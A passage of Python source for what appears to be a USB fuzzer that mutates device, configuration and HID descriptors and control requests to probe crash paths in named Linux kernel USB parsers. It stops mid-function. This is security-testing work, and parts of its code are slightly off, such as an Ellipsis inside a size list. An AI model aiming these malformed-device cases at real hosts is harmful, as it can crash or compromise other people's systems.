#!/usr/bin/env python3
"""
strategy.py — 基于真实 Linux/Android USB 源码分析的增强模糊测试策略

策略来源（源码文件 → 漏洞模式 → 测试用例）:
  drivers/usb/core/config.c   → 描述符边界检查绕过
  drivers/usb/core/hub.c      → 枚举状态机异常
  drivers/usb/core/message.c  → 控制传输 URB 处理
  drivers/hid/hid-core.c      → HID 报告描述符解析
  drivers/usb/storage/*.c     → SCSI/BOT/UAS 协议
  drivers/net/usb/*.c          → USB 网卡 (RNDIS/ECM)
  Android UsbHostManager.java → JNI Native 崩溃
  Android UsbService.java     → Framework 异常
"""

from __future__ import annotations

import struct
import random
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Optional

# ═══════════════════════════════════════════════════════════════════════════════
# 从源码中提取的精确常量值 — 这些是变异的"靶心"
# ═══════════════════════════════════════════════════════════════════════════════

# --- drivers/usb/core/hub.c 枚举常量 ---
HUB_CONSTS = {
    "GET_DESCRIPTOR_TRIES":      2,      # 最大重试次数 (USB2.0)
    "GET_DESCRIPTOR_BUFSIZE":    64,     # 首次描述符读取的缓冲区大小
    "SET_ADDRESS_TRIES":         2,
    "PORT_RESET_TRIES":          5,
    "PORT_INIT_TRIES":           4,
    "DETECT_DISCONNECT_TRIES":   5,
    "USB_CTRL_SET_TIMEOUT":      5000,   # ms
    "USB_SHORT_SET_ADDRESS_REQ_TIMEOUT": 500, # ms
    "HUB_DEBOUNCE_TIMEOUT":      2000,   # ms
}

# --- drivers/hid/hid-core.c 限制值 ---
HID_LIMITS = {
    "HID_MAX_DESCRIPTOR_SIZE":   4096,   # 最大报告描述符大小
    "HID_MAX_USAGES":            12288,
    "HID_MAX_FIELDS":            128,
    "HID_MAX_IDS":               256,
    "HID_MAX_BUFFER_SIZE":       65536,
    "HID_DEFAULT_MAX_BUFFER_SIZE": 8192,
}

# --- 描述符大小常量 (drivers/usb/core/config.c) ---
DESC_SIZES = {
    "USB_DT_DEVICE_SIZE":        18,
    "USB_DT_CONFIG_SIZE":        9,
    "USB_DT_INTERFACE_SIZE":     9,
    "USB_DT_ENDPOINT_SIZE":      7,
    "USB_DT_ENDPOINT_AUDIO_SIZE": 9,    # 等时端点的扩展大小
    "USB_DT_SS_EP_COMP_SIZE":    6,     # SuperSpeed 端点伴侣
    "USB_DT_SSP_ISOC_EP_COMP_SIZE": 8,  # SuperSpeedPlus
    "USB_DT_HID_SIZE":           9,
    "USB_DT_REPORT_SIZE":        0,     # 变长
}

# --- USB 设备类码 ---
USB_CLASS_CODES = {
    0x00: "使用接口描述符定义",
    0x02: "通信设备 (CDC)",
    0x03: "HID (人机接口设备)",
    0x05: "物理设备",
    0x06: "图像设备",
    0x07: "打印机",
    0x08: "大容量存储 (MSC)",
    0x09: "Hub",
    0x0A: "CDC-Data",
    0x0B: "智能卡",
    0x0D: "内容安全",
    0x0E: "视频设备 (UVC)",
    0x0F: "个人医疗",
    0x10: "音频/视频设备",
    0x11: " billboarding",
    0xDC: "诊断设备",
    0xE0: "无线控制器 (蓝牙)",
    0xEF: "杂项设备",
    0xFE: "应用特定",
    0xFF: "厂商特定",
}

# --- 端点类型 ---
EP_TYPES = {
    0x00: "控制 (Control)",
    0x01: "等时 (Isochronous)",
    0x02: "批量 (Bulk)",
    0x03: "中断 (Interrupt)",
}

# --- wMaxPacketSize 限制 (高速 USB 2.0) ---
EP_MAXPACKET_SIZES = {
    "control":      [8, 16, 32, 64],
    "interrupt":    [1, 2, ..., 1024],   # 高速最大 1024
    "bulk":         [512],                # 高速必须 512
    "isochronous":  [1024],               # 高速最大 1024
    "ss_bulk":      [1024],               # SuperSpeed
    "ss_interrupt": [1024],
    "ss_isoch":     [1024, 2048, 3072],  # SS+ 可达 3072
}


# ═══════════════════════════════════════════════════════════════════════════════
# 模板描述符 — 基于真实 USB 规范
# ═══════════════════════════════════════════════════════════════════════════════

# 标准 HID 设备 — 键盘 (18 字节)
TPL_DEVICE_DESC = bytes([
    0x12,       # bLength
    0x01,       # bDescriptorType (Device)
    0x00, 0x02, # bcdUSB 2.0
    0x00,       # bDeviceClass (defined in interface)
    0x00,       # bDeviceSubClass
    0x00,       # bDeviceProtocol
    0x40,       # bMaxPacketSize0 (64)
    0x34, 0x12, # idVendor (示例)
    0x78, 0x56, # idProduct (示例)
    0x00, 0x01, # bcdDevice
    0x01,       # iManufacturer
    0x02,       # iProduct
    0x03,       # iSerialNumber
    0x01,       # bNumConfigurations
])

# 配置描述符 (34 字节 — HID 键盘)
TPL_CONFIG_DESC = bytes([
    # --- Configuration Descriptor (9 bytes) ---
    0x09,       # bLength
    0x02,       # bDescriptorType (Configuration)
    0x22, 0x00, # wTotalLength (34 bytes)
    0x01,       # bNumInterfaces
    0x01,       # bConfigurationValue
    0x00,       # iConfiguration
    0x80,       # bmAttributes (Bus Powered)
    0x32,       # MaxPower (100mA)
    # --- Interface Descriptor (9 bytes) ---
    0x09,       # bLength
    0x04,       # bDescriptorType (Interface)
    0x00,       # bInterfaceNumber
    0x00,       # bAlternateSetting
    0x01,       # bNumEndpoints
    0x03,       # bInterfaceClass (HID)
    0x01,       # bInterfaceSubClass (Boot Interface)
    0x01,       # bInterfaceProtocol (Keyboard)
    0x00,       # iInterface
    # --- HID Descriptor (9 bytes) ---
    0x09,       # bLength
    0x21,       # bDescriptorType (HID)
    0x10, 0x01, # bcdHID (1.10)
    0x00,       # bCountryCode
    0x01,       # bNumDescriptors
    0x22,       # bDescriptorType (Report)
    0x3F, 0x00, # wDescriptorLength (63 bytes)
    # --- Endpoint Descriptor (7 bytes) ---
    0x07,       # bLength
    0x05,       # bDescriptorType (Endpoint)
    0x81,       # bEndpointAddress (IN, EP1)
    0x03,       # bmAttributes (Interrupt)
    0x08, 0x00, # wMaxPacketSize (8)
    0x0A,       # bInterval (10ms)
])

# HID Report Descriptor (键盘 — 63 bytes)
TPL_HID_REPORT = bytes([
    0x05, 0x01, # Usage Page (Generic Desktop)
    0x09, 0x06, # Usage (Keyboard)
    0xA1, 0x01, # Collection (Application)
    0x05, 0x07, #   Usage Page (Keyboard)
    0x19, 0xE0, #   Usage Minimum (Left Control)
    0x29, 0xE7, #   Usage Maximum (Right GUI)
    0x15, 0x00, #   Logical Minimum (0)
    0x25, 0x01, #   Logical Maximum (1)
    0x75, 0x01, #   Report Size (1)
    0x95, 0x08, #   Report Count (8)
    0x81, 0x02, #   Input (Data,Var,Abs)
    0x95, 0x01, #   Report Count (1)
    0x75, 0x08, #   Report Size (8)
    0x81, 0x01, #   Input (Cnst,Arr,Abs)
    0x95, 0x05, #   Report Count (5)
    0x75, 0x01, #   Report Size (1)
    0x05, 0x08, #   Usage Page (LEDs)
    0x19, 0x01, #   Usage Minimum (Num Lock)
    0x29, 0x05, #   Usage Maximum (Kana)
    0x91, 0x02, #   Output (Data,Var,Abs)
    0x95, 0x01, #   Report Count (1)
    0x75, 0x03, #   Report Report Size (3)
    0x91, 0x01, #   Output (Cnst,Arr,Abs)
    0x95, 0x06, #   Report Count (6)
    0x75, 0x08, #   Report Size (8)
    0x15, 0x00, #   Logical Minimum (0)
    0x25, 0x65, #   Logical Maximum (101)
    0x05, 0x07, #   Usage Page (Keyboard)
    0x19, 0x00, #   Usage Minimum (0)
    0x29, 0x65, #   Usage Maximum (101)
    0x81, 0x00, #   Input (Data,Arr,Abs)
    0xC0,       # End Collection
])

# MSC (大容量存储) 配置描述符
TPL_MSC_CONFIG = bytes([
    # Configuration Descriptor
    0x09, 0x02, 0x20, 0x00, 0x01, 0x01, 0x00, 0x80, 0x32,
    # Interface Descriptor
    0x09, 0x04, 0x00, 0x00, 0x02, 0x08, 0x06, 0x50, 0x00,
    # Endpoint IN (Bulk)
    0x07, 0x05, 0x81, 0x02, 0x00, 0x02, 0x00,
    # Endpoint OUT (Bulk)
    0x07, 0x05, 0x02, 0x02, 0x00, 0x02, 0x00,
])


# ═════════════════════════════════════════════════　════════════════════════════
# 变异引擎 — 基础变异原语 (AFL/Syzkaller 风格)
# ═══════════════════════════════════════════════════════════════════════════════

class Mutator:
    """变异引擎 — 15 种基础变异原语 + USB 特定变异"""

    INTEREST_8  = [0, 1, 2, 3, 4, 8, 16, 32, 64, 100, 127, 128, 129, 200, 254, 255]
    INTEREST_16 = [0, 1, 2, 3, 4, 8, 16, 32, 64, 100, 127, 128, 255, 256, 511, 512,
                   1000, 1023, 1024, 4096, 32767, 32768, 65534, 65535]
    INTEREST_32 = [0, 1, 2, 3, 4, 8, 16, 32, 64, 127, 128, 255, 256, 511, 512,
                   4096, 32767, 32768, 65535, 65536, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF]

    def __init__(self, rng: Optional[random.Random] = None):
        self.rng = rng or random.Random()

    # ── 基础变异原语 ──

    def bitflip(self, data: bytes) -> bytes:
        buf = bytearray(data)
        byte_idx = self.rng.randrange(len(buf))
        bit_idx = self.rng.randrange(8)
        buf[byte_idx] ^= (1 << bit_idx)
        return bytes(buf)

    def byteflip(self, data: bytes) -> bytes:
        buf = bytearray(data)
        idx = self.rng.randrange(len(buf))
        buf[idx] ^= 0xFF
        return bytes(buf)

    def arith(self, data: bytes, max_delta: int = 35) -> bytes:
        buf = bytearray(data)
        idx = self.rng.randrange(len(buf))
        buf[idx] = (buf[idx] + self.rng.randint(-max_delta, max_delta)) & 0xFF
        return bytes(buf)

    def interest_8(self, data: bytes) -> bytes:
        buf = bytearray(data)
        idx = self.rng.randrange(len(buf))
        buf[idx] = self.rng.choice(self.INTEREST_8)
        return bytes(buf)

    def interest_16(self, data: bytes) -> bytes:
        buf = bytearray(data)
        if len(buf) < 2:
            return bytes(buf)
        idx = self.rng.randrange(len(buf) - 1)
        val = self.rng.choice(self.INTEREST_16)
        struct.pack_into('<H', buf, idx, val & 0xFFFF)
        return bytes(buf)

    def interest_32(self, data: bytes) -> bytes:
        buf = bytearray(data)
        if len(buf) < 4:
            return bytes(buf)
        idx = self.rng.randrange(len(buf) - 3)
        val = self.rng.choice(self.INTEREST_32)
        struct.pack_into('<I', buf, idx, val & 0xFFFFFFFF)
        return bytes(buf)

    def insert_bytes(self, data: bytes, max_count: int = 8) -> bytes:
        idx = self.rng.randrange(len(data) + 1)
        count = self.rng.randint(1, max_count)
        new_bytes = bytes(self.rng.randint(0, 255) for _ in range(count))
        return data[:idx] + new_bytes + data[idx:]

    def delete_bytes(self, data: bytes, max_count: int = 4) -> bytes:
        if len(data) <= max_count:
            return data
        idx = self.rng.randrange(len(data) - max_count)
        count = self.rng.randint(1, max_count)
        return data[:idx] + data[idx+count:]

    def duplicate_chunk(self, data: bytes, max_chunk: int = 16) -> bytes:
        if len(data) < 2:
            return data
        chunk_size = min(self.rng.randint(1, max_chunk), len(data))
        src_idx = self.rng.randrange(len(data) - chunk_size + 1)
        dst_idx = self.rng.randrange(len(data) + 1)
        chunk = data[src_idx:src_idx+chunk_size]
        return data[:dst_idx] + chunk + data[dst_idx:]

    def havoc(self, data: bytes, iterations: int = 8) -> bytes:
        """随机组合多种变异 (AFL havoc 模式)"""
        buf = bytearray(data)
        ops = [self.bitflip, self.byteflip, self.arith, self.interest_8,
               self.interest_16, self.interest_32, self.insert_bytes,
               self.delete_bytes, self.duplicate_chunk]
        for _ in range(iterations):
            op = self.rng.choice(ops)
            buf = bytearray(op(bytes(buf)))
        return bytes(buf)

    # ── USB 描述符特定变异 ──

    def mutate_descriptor_length(self, data: bytes) -> bytes:
        """篡改 bLength — 来自 config.c 中 `size -= h->bLength` 的攻击面"""
        buf = bytearray(data)
        # 关键边界值: 0, 1, size-1, size+1, 0xFF
        target_length = self.rng.choice([
            0, 1, 2,                                    # 过小 → 负偏移
            len(data) - 1,                              # 比实际小 1
            len(data),                                  # 正好
            len(data) + 1,                              # 超出 1 字节
            len(data) + 9,                              # 超出一个描述符大小
            0xFF,                                        # 最大值
        ])
        buf[0] = target_length & 0xFF
        return bytes(buf)

    def mutate_descriptor_type(self, data: bytes) -> bytes:
        """篡改 bDescriptorType — 来自 config.c find_next_descriptor() 解析器混淆"""
        buf = bytearray(data)
        # 所有已知类型码 + 随机值
        known_types = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                       0x08, 0x09, 0x0A, 0x0B, 0x21, 0x22, 0x23,
                       0x24, 0x25, 0x30, 0x41, 0x42, 0xFF]
        buf[1] = self.rng.choice(known_types + [self.rng.randint(0, 255)])
        return bytes(buf)

    def mutate_vid_pid(self, data: bytes) -> bytes:
        """篡改 VID/PID — 触发特定驱动加载路径"""
        buf = bytearray(data)
        if len(buf) >= 12:
            # 知名 VID 列表 + 随机
            known_vids = [0x05AC, 0x046D, 0x045E, 0x054C, 0x18D1,
                          0x19E5, 0x22B8, 0x0BB4, 0x04E8, 0x0781]
            vid = self.rng.choice(known_vids + [self.rng.randint(0, 0xFFFF)])
            pid = self.rng.randint(0, 0xFFFF)
            struct.pack_into('<HH', buf, 8, vid, pid)
        return bytes(buf)

    def mutate_class_codes(self, data: bytes) -> bytes:
        """篡改 Device Class/SubClass/Protocol — 触发不同驱动匹配"""
        buf = bytearray(data)
        if len(buf) >= 7:
            class_codes = list(USB_CLASS_CODES.keys())
            buf[4] = self.rng.choice(class_codes + [0xFF])  # bDeviceClass
            buf[5] = self.rng.randint(0, 255)                # bDeviceSubClass
            buf[6] = self.rng.randint(0, 255)                # bDeviceProtocol
        return bytes(buf)


# ═══════════════════════════════════════════════════════════════════════════════
# 测试用例与阶段定义
# ═══════════════════════════════════════════════════════════════════════════════

class FuzzPhase(IntEnum):
    DESCRIPTOR     = 1   # Phase 1: 描述符变异
    CONTROL        = 2   # Phase 2: 控制传输模糊
    ENUMERATION    = 3   # Phase 3: 枚举状态机
    DATA_TRANSFER  = 4   # Phase 4: 数据传输模糊
    TIMING         = 5   # Phase 5: 时序模糊
    HID_REPORT     = 6   # Phase 6: HID 报告描述符 (新增 — 来自 hid-core.c 分析)
    CLASS_SPECIFIC = 7   # Phase 7: 类特定协议 (MSC/CDC/UVC — 来自 storage/net 分析)
    MOBILE_SPECIFIC = 8  # Phase 8: 移动设备协议 (RNDIS/AOA/MTP — 嵌入式设备常见)
    # ── 深度协议模糊 (v2 扩展 — 基于 syzkaller/raw-gadget/USBFuzz 调研) ──
    HID_DEEP       = 9   # Phase 9:  HID 语义深度 (multi-touch/ff/raw 底层 — hid-input.c)
    MSC_DEEP       = 10  # Phase 10: SCSI/BOT/UAS 深度 (CBW 状态机/UAS 协议 — transport.c)
    CDC_DEEP       = 11  # Phase 11: CDC-ACM/ECM 深度 (line coding/notify/cdc_ether — cdc-acm.c)
    UVC_DEEP       = 12  # Phase 12: UVC 视频深度 (streaming/format/frame — uvc_driver.c)
    AUDIO_DEEP     = 13  # Phase 13: UAC 音频深度 (v1/v2/v3 format/mixer — format.c/audio.c)
    RNDIS_DEEP     = 14  # Phase 14: RNDIS/网络深度 (INIT/OID/keepalive — rndis_host.c)
    CVE_REPLAY     = 15  # Phase 15: CVE 复现 (60+ 历史漏洞精确复现 2015-2025)


PHASE_NAMES = {
    FuzzPhase.DESCRIPTOR:     "描述符变异",
    FuzzPhase.CONTROL:        "控制传输模糊",
    FuzzPhase.ENUMERATION:    "枚举状态机",
    FuzzPhase.DATA_TRANSFER:  "数据传输模糊",
    FuzzPhase.TIMING:         "时序模糊",
    FuzzPhase.HID_REPORT:     "HID 报告描述符",
    FuzzPhase.CLASS_SPECIFIC: "类特定协议",
    FuzzPhase.MOBILE_SPECIFIC: "移动设备协议",
    FuzzPhase.HID_DEEP:       "HID 语义深度",
    FuzzPhase.MSC_DEEP:       "MSC/SCSI 深度",
    FuzzPhase.CDC_DEEP:       "CDC/串口深度",
    FuzzPhase.UVC_DEEP:       "UVC 视频深度",
    FuzzPhase.AUDIO_DEEP:     "UAC 音频深度",
    FuzzPhase.RNDIS_DEEP:    "RNDIS/网络深度",
    FuzzPhase.CVE_REPLAY:    "CVE 复现",
}

# 源码分析来源说明
PHASE_SOURCES = {
    FuzzPhase.DESCRIPTOR:     "drivers/usb/core/config.c → find_next_descriptor(), usb_parse_endpoint()",
    FuzzPhase.CONTROL:        "drivers/usb/core/message.c → usb_control_msg(), URB 处理",
    FuzzPhase.ENUMERATION:    "drivers/usb/core/hub.c → hub_port_init(), hub_set_address()",
    FuzzPhase.DATA_TRANSFER:  "drivers/usb/core/urb.c, drivers/usb/core/message.c → bulk/msg 传输",
    FuzzPhase.TIMING:         "drivers/usb/core/hub.c → 枚举重试/超时常量",
    FuzzPhase.HID_REPORT:     "drivers/hid/hid-core.c → hid_parse_report(), hid_open_report()",
    FuzzPhase.CLASS_SPECIFIC: "drivers/usb/storage/transport.c, drivers/net/usb/*.c",
    FuzzPhase.MOBILE_SPECIFIC:   "Android UsbHostManager.java, drivers/usb/gadget, AOA 协议",
    FuzzPhase.HID_DEEP:       "drivers/hid/hid-input.c, hidraw.c, hid-multitouch.c → 语义级报告变异",
    FuzzPhase.MSC_DEEP:       "drivers/usb/storage/transport.c → US_BULK_CB_SIGN/CBLUN, scsiglue.c → max_lun",
    FuzzPhase.CDC_DEEP:       "drivers/usb/class/cdc-acm.c → SET_LINE_CODING/SEND_BREAK, cdc_ether.c",
    FuzzPhase.UVC_DEEP:       "drivers/media/usb/uvc/uvc_driver.c → uvc_parse_format(), bmaControls",
    FuzzPhase.AUDIO_DEEP:     "sound/usb/format.c → parse_audio_format_i_type(), sound/usb/audio.c",
    FuzzPhase.RNDIS_DEEP:     "drivers/net/usb/rndis_host.c → rndis_command(), msg_type/request_id 状态机",
}


@dataclass
class FuzzCase:
    """单个模糊测试用例"""
    case_id: int
    phase: FuzzPhase
    description: str
    # 设备模拟参数
    device_descriptor:   Optional[bytes] = None
    config_descriptor:   Optional[bytes] = None
    hid_report_descriptor: Optional[bytes] = None
    string_descriptors:  Optional[dict[int, bytes]] = None
    # 控制传输参数
    stall_ep0:           bool = False
    disconnect_on_req:   Optional[str] = None  # "GET_DESC", "SET_ADDR", "SET_CONFIG"
    delay_response_ms:   int = 0
    # 数据传输参数
    ep_data_override:    Optional[dict[int, bytes]] = None  # {endpoint_addr: data}
    # 类特定参数
    class_request_handler: Optional[str] = None  # "CBW_FUZZ", "RNDIS_FUZZ" 等
    # 元数据
    source_ref:          str = ""  # 对应的源码位置
    tags:                list[str] = field(default_factory=list)

    def to_json(self) -> dict:
        d = {}
        for k, v in self.__dict__.items():
            if isinstance(v, bytes):
                d[k] = v.hex()
            elif isinstance(v, dict):
                d[k] = {str(k2): v2.hex() if isinstance(v2, bytes) else v2 for k2, v2 in v.items()}
            elif isinstance(v, FuzzPhase):
                d[k] = int(v)
            elif isinstance(v, list):
                d[k] = v
            else:
                d[k] = v
        return d

    @classmethod
    def from_json(cls, d: dict) -> "FuzzCase":
        kwargs = {}
        for k, v in d.items():
            if k in ("device_descriptor", "config_descriptor", "hid_report_descriptor") and isinstance(v, str):
                kwargs[k] = bytes.fromhex(v)
            elif k == "string_descriptors" and isinstance(v, dict):
                kwargs[k] = {int(k2): bytes.fromhex(v2) if isinstance(v2, str) else v2 for k2, v2 in v.items()}
            elif k == "ep_data_override" and isinstance(v, dict):
                kwargs[k] = {int(k2): bytes.fromhex(v2) if isinstance(v2, str) else v2 for k2, v2 in v.items()}
            elif k == "phase" and isinstance(v, int):
                kwargs[k] = FuzzPhase(v)
            else:
                kwargs[k] = v
        return cls(**kwargs)


# ══════════════════════════════════════════ ════════════════════════════════════
# 策略生成器 — 8 个阶段，每个阶段的用例都映射到具体源码路径
# ═══════════════════════════════════════════════════════════════════════════════

class StrategyGenerator:
    """基于源码分析的策略生成器"""

    # 设备类型配置
    PROFILES = {
        "generic-hid":    {"vid": 0x1234, "pid": 0x5678, "class": 0x00, "subclass": 0x00, "protocol": 0x00},
        "keyboard":       {"vid": 0x1234, "pid": 0x5678, "class": 0x00, "subclass": 0x00, "protocol": 0x00},
        "mouse":          {"vid": 0x1234, "pid": 0x5679, "class": 0x00, "subclass": 0x00, "protocol": 0x00},
        "generic-msc":    {"vid": 0x054C, "pid": 0x01D0, "class": 0x00, "subclass": 0x00, "protocol": 0x00},
        "generic-cdc":    {"vid": 0x05AC, "pid": 0x1402, "class": 0x02, "subclass": 0x00, "protocol": 0x00},
        "generic-uvc":    {"vid": 0x045E, "pid": 0x075D, "class": 0x0E, "subclass": 0x00, "protocol": 0x00},
        "generic-audio":  {"vid": 0x1234, "pid": 0x56AB, "class": 0x00, "subclass": 0x00, "protocol": 0x00},
        "rndis-net":      {"vid": 0x0422, "pid": 0x1234, "class": 0xEF, "subclass": 0x01, "protocol": 0x01},
        "aoa-device":     {"vid": 0x18D1, "pid": 0x2D00, "class": 0x00, "subclass": 0x00, "protocol": 0x00},
        "generic-ubs":    {"vid": 0x1234, "pid": 0x56CD, "class": 0x09, "subclass": 0x00, "protocol": 0x00},
        "generic-vendor": {"vid": 0x1234, "pid": 0x56FF, "class": 0xFF, "subclass": 0xFF, "protocol": 0xFF},
    }

    def __init__(self, mutator: Mutator, profile: str = "generic-hid"):
        self.mutator = mutator
        self.profile = profile
        self._case_counter = 0

    def _next_id(self) -> int:
        self._case_counter += 1
        return self._case_counter

    def _new_case(self, phase: FuzzPhase, description: str, **kwargs) -> FuzzCase:
        return FuzzCase(
            case_id=self._next_id(),
            phase=phase,
            description=description,
            **kwargs,
        )

    def _base_device_desc(self) -> bytes:
        """获取基础设备描述符（根据 profile 定制）"""
        buf = bytearray(TPL_DEVICE_DESC)
        prof = self.PROFILES.get(self.profile, self.PROFILES["generic-hid"])
        buf[4], buf[5], buf[6] = prof["class"], prof["subclass"], prof["protocol"]
        struct.pack_into('<HH', buf, 8, prof["vid"], prof["pid"])
        return bytes(buf)

    def _base_config_desc(self) -> bytes:
        if "msc" in self.profile:
            return TPL_MSC_CONFIG
        return TPL_CONFIG_DESC

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 1: 描述符变异 — drivers/usb/core/config.c
    # ═══════════════════════════════════════════════════════════════════════

    def gen_descriptor_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        """
        策略来源: config.c 的 find_next_descriptor() 循环:
          while (size > 0) {
              buffer += h->bLength;
              size -= h->bLength;     ← 如果 bLength=0，死循环
          }
        和 usb_parse_endpoint():
          if (d->bLength >= USB_DT_ENDPOINT_AUDIO_SIZE)  ← 边界分支
          else if (d->bLength >= USB_DT_ENDPOINT_SIZE)
        """
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        # 1.1 bLength 篡改 — config.c `size -= h->bLength`
        # 关键攻击值: 0 (死循环), 1 (仅 1 字节前进), size-1, size+1, 0xFF
        for i in range(min(10, max_cases)):
            mutated = self.mutator.mutate_descriptor_length(base_dev)
            cases.append(self._new_case(
                FuzzPhase.DESCRIPTOR,
                f"DeviceDesc bLength={mutated[0]:#x} (原始=0x12)",
                device_descriptor=mutated,
                source_ref="config.c:find_next_descriptor() — size -= h->bLength",
                tags=["bLength", "device_desc"],
            ))

        # 1.2 Config descriptor wTotalLength 篡改
        for i in range(min(6, max_cases)):
            cfg = bytearray(base_cfg)
            total_len_vals = [
                0, 1, 8,                       # 过小
                len(base_cfg) - 1,              # 比实际小
                len(base_cfg) + 100,            # 超出实际
                0xFFFF,                          # 最大值
                0x00FF,                          # 大但不合理
            ]
            val = self.mutator.rng.choice(total_len_vals)
            struct.pack_into('<H', cfg, 2, val)
            cases.append(self._new_case(
                FuzzPhase.DESCRIPTOR,
                f"ConfigDesc wTotalLength={val} (实际={len(base_cfg)})",
                device_descriptor=base_dev,
                config_descriptor=bytes(cfg),
                source_ref="config.c:usb_parse_configuration() — desc->wTotalLength",
                tags=["wTotalLength", "config_desc"],
            ))

        # 1.3 bDescriptorType 篡改 — 使解析器进入错误分支
        for i in range(min(4, max_cases)):
            mutated = self.mutator.mutate_descriptor_type(base_dev)
            cases.append(self._new_case(
                FuzzPhase.DESCRIPTOR,
                f"DeviceDesc bDescriptorType={mutated[1]:#x} (原始=0x01)",
                device_descriptor=mutated,
                source_ref="config.c:find_next_descriptor() — 类型混淆",
                tags=["bDescriptorType"],
            ))

        # 1.4 bNumInterfaces 声称有比实际更多的接口
        for extra in [5, 16, 50, 255]:
            cfg = bytearray(base_cfg)
            cfg[4] = extra  # bNumInterfaces
            cases.append(self._new_case(
                FuzzPhase.DESCRIPTOR,
                f"ConfigDesc bNumInterfaces={extra} (实际=1) — 越界读取",
                device_descriptor=base_dev,
                config_descriptor=bytes(cfg),
                source_ref="config.c:usb_parse_configuration() — bNumInterfaces > 实际接口数",
                tags=["bNumInterfaces", "OOB"],
            ))

        # 1.5 Endpoint bLength 篡改 — config.c usb_parse_endpoint()
        cfg = bytearray(base_cfg)
        ep_offset = len(base_cfg) - 7  # 最后 7 字节是 endpoint desc
        for ep_len in [0, 3, 6, 8, 9, 0xFF]:
            cfg2 = bytearray(cfg)
            cfg2[ep_offset] = ep_len  # endpoint bLength
            cases.append(self._new_case(
                FuzzPhase.DESCRIPTOR,
                f"EP bLength={ep_len} (原始=7) — USB_DT_ENDPOINT_SIZE/AUDIO_SIZE 分支",
                device_descriptor=base_dev,
                config_descriptor=bytes(cfg2),
                source_ref="config.c:usb_parse_endpoint() — if (d->bLength >= USB_DT_ENDPOINT_AUDIO_SIZE)",
                tags=["endpoint", "bLength"],
            ))

        # 1.6 wMaxPacketSize 篡改 — 超出协议限制
        cfg = bytearray(base_cfg)
        ep_offset = len(base_cfg) - 7
        for mps in [0, 1, 0x0800, 0x4000, 0xFFFF]:
            cfg2 = bytearray(cfg)
            struct.pack_into('<H', cfg2, ep_offset + 4, mps)
            cases.append(self._new_case(
                FuzzPhase.DESCRIPTOR,
                f"EP wMaxPacketSize={mps:#x} — 超出高速限制",
                device_descriptor=base_dev,
                config_descriptor=bytes(cfg2),
                source_ref="config.c:usb_parse_endpoint() — maxpacket check",
                tags=["wMaxPacketSize", "endpoint"],
            ))

        # 1.7 嵌套描述符 — 在 config desc 中插入意外的子描述符
        for dt in [0x21, 0x24, 0x25, 0x30, 0xFF]:
            cfg2 = bytearray(base_cfg)
            # 在 endpoint 前插入一个不期望的描述符
            insert_pos = len(base_cfg) - 7
            fake_desc = bytes([4, dt, 0x00, 0x00])
            cfg2 = cfg2[:insert_pos] + fake_desc + cfg2[insert_pos:]
            # 更新 wTotalLength
            struct.pack_into('<H', cfg2, 2, len(cfg2))
            cases.append(self._new_case(
                FuzzPhase.DESCRIPTOR,
                f"插入未预期描述符 type={dt:#x} — 解析器路径混淆",
                device_descriptor=base_dev,
                config_descriptor=bytes(cfg2),
                source_ref="config.c:usb_parse_interface() — 非预期子描述符处理",
                tags=["nested", "descriptor_injection"],
            ))

        return cases

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 2: 控制传输模糊 — drivers/usb/core/message.c
    # ═══════════════════════════════════════════════════════════════════════

    def gen_control_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        """
        策略来源: message.c 的 usb_control_msg():
          dr->bRequest = request;
          dr->wValue = cpu_to_le16(value);
          dr->wLength = cpu_to_le16(size);
        以及 hub.c 中的标准请求处理。
        """
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        # 2.1 对 GET_DESCRIPTOR 返回异常数据
        for desc_type in [0x01, 0x02, 0x03, 0x06, 0x07]:
            for wLength in [0, 1, 0xFF, 0xFFFF]:
                cases.append(self._new_case(
                    FuzzPhase.CONTROL,
                    f"GET_DESCRIPTOR(type={desc_type:#x}) wLength={wLength} — 返回错误长度",
                    device_descriptor=base_dev,
                    config_descriptor=base_cfg,
                    ep_data_override={0x80: bytes(self.mutator.rng.randint(0, 255) for _ in range(min(wLength, 64)))},
                    source_ref="message.c:usb_control_msg() — wLength != 实际数据长度",
                    tags=["GET_DESCRIPTOR", "wLength_mismatch"],
                ))

        # 2.2 对 SET_CONFIGURATION 返回 STALL
        cases.append(self._new_case(
            FuzzPhase.CONTROL,
            "SET_CONFIGURATION 后 EP0 STALL — hub_port_init 后续步骤失败",
            device_descriptor=base_dev,
            config_descriptor=base_cfg,
            stall_ep0=True,
            disconnect_on_req="SET_CONFIG",
            source_ref="hub.c:hub_port_init() — SET_CONFIGURATION 失败处理",
            tags=["STALL", "SET_CONFIGURATION"],
        ))

        # 2.3 异常的 Standard 请求
        for bmRequestType in [0x00, 0x01, 0x02, 0x80, 0x81, 0x82, 0xC0, 0xC1]:
            for bRequest in range(0, 16):
                cases.append(self._new_case(
                    FuzzPhase.CONTROL,
                    f"异常控制请求 bmRequestType={bmRequestType:#x} bRequest={bRequest}",
                    device_descriptor=base_dev,
                    config_descriptor=base_cfg,
                    class_request_handler=f"RAW:{bmRequestType:#x}:{bRequest}",
                    source_ref="message.c:usb_control_msg() — 未处理的请求类型",
                    tags=["control", "unhandled_request"],
                ))

        # 控制数量到 max_cases
        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 3: 枚举状态机 — drivers/usb/core/hub.c
    # ═══════════════════════════════════════════════════════════════════════

    def gen_enumeration_cases(self, max_cases: int = 20) -> list[FuzzCase]:
        """
        策略来源: hub.c hub_port_init() 枚举序列:
          1. GET_DESCRIPTOR (64 bytes, timeout=initial_descriptor_timeout)
          2. SET_ADDRESS (timeout=5000ms / 500ms quirk)
          3. GET_DESCRIPTOR (full 18 bytes)
          4. GET_DESCRIPTOR (config)
          5. SET_CONFIGURATION
        
        攻击: 在每个步骤中断/延迟/返回错误
        """
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        # 3.1 在特定枚举步骤断连
        for step in ["GET_DESC", "SET_ADDR", "GET_FULL_DESC", "GET_CONFIG", "SET_CONFIG"]:
            cases.append(self._new_case(
                FuzzPhase.ENUMERATION,
